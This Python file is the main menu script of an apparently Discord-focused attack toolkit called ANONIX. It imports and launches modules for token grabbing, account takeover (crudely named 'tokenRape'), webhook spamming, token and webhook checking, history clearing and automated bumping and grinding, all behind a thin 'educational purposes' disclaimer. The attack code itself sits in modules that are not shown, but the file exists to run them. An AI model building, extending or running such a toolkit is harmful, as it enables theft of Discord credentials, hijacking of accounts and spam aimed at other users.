from colored import fg, bg, attr
import time
import os

import modules.tokenRape as tokenRape
import modules.historyClear as historyClear
import modules.tokenWebhookChecker as checkers
import modules.webhookSpammer as spammer
import modules.autoBump as bumper
import modules.tokenGrabber as grabber
import modules.credits as credits
import modules.dankMemer as memer

r = fg(241) # Setup color variables
r2 = fg(255)
b = fg(31)
w = fg(15)
y = fg(3) + attr(1)
d = r2 + attr(21)

class Client:
    def __init__(self):
        modules = {
            "1" : {"function" : tokenRape.rape, "name" : "TokenRape"},
            "2" : {"function" : spammer.spammer, "name" : "WebhookSpammer"},
            "3" : {"function" : checkers.token, "name" : "TokenChecker"},
            "4" : {"function" : checkers.webhook, "name" : "WebhookChecker"},
            "5" : {"function" : historyClear.clear, "name" : "HistoryClear"},
            "6" : {"function" : bumper.bumper, "name" : "AutoBump"},
            "7" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
            "8" : {"function" : memer.start, "name" : "Dank memer gridner"},
            "9" : {"function" : credits.show_credits, "name" : "Credits"},
            "10" : {"function" : exit, "name" : "Exit"}
        }
        self.modules = modules

    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f""" {r2} █████{b}╗{r2} ███{b}╗{r2}   ██{b}╗{r2} ██████{b}╗{r2} ███{b}╗{r2}   ██{b}╗{r2}██{b}╗{r2}██{b}╗{r2}  ██{b}╗{r2}
 ██{b}╔══{r2}██{b}╗{r2}████{b}╗  {r2}██{b}║{r2}██{b}╔═══{r2}██{b}╗{r2}████{b}╗  {r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}╔╝{r2}
 ███████{b}║{r2}██{b}╔{r2}██{b}╗ {r2}██{b}║{r2}██{b}║   {r2}██{b}║{r2}██{b}╔{r2}██{b}╗ {r2}██{b}║{r2}██{b}║ ╚{r2}███{b}╔╝{r2}
 ██{b}╔══{r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}║{r2}██{b}║   {r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}║{r2}██{b}║ {r2}██{b}╔{r2}██{b}╗{r2}
 ██{b}║  {r2}██{b}║{r2}██{b}║ ╚{r2}████{b}║╚{r2}██████{b}╔╝{r2}██{b}║ ╚{r2}████{b}║{r2}██{b}║{r2}██{b}╔╝ {r2}██{b}╗{r2}
 {b}╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
{r2} * DISCLAIMR: This script is made for           *
 * educational purporses and the developers     *
 * assume no liabilaty and are not responsible  *
 * for any misuse or damages caused by the      *
 * script                                       *
""")
        indx = 0
        for key, val in self.modules.items():
            print(
                f" {r2}[{b}{key}{r2}] {val['name']:<20}",
                end = "" if indx % 2 == 0 else "\n"
            )
            indx += 1

        if indx % 2 == 1:
            print("")

        option = input(f"\n {r2}[{b}?{r2}] Option: ")

        data = self.modules[option]

        data["function"]()

        input(f"\n {r2}[{b}!{r2}] Done! Press enter to continue")
        self.main()

if __name__ == '__main__':
    client = Client()
    client.main()
